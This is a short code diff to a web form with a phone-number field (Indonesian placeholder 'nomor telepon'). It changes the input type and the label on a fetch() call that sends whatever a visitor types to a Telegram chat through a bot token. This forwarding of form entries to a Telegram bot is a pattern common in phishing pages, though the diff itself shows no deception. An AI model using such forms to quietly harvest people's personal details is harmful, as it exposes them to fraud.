@@ -34,7 +34,7 @@
 
             <div class="input-box">
 
-              <input type="message" id="message" placeholder="nomor telepon" required>
+              <input type="number" id="message" placeholder="nomor telepon" required>
 
             </div>
 
@@ -88,7 +88,7 @@ form.addEventListener("submit", e => {
 
   
 
-  fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=name:${message.value}
+  fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=number:${message.value}
 
                              
 
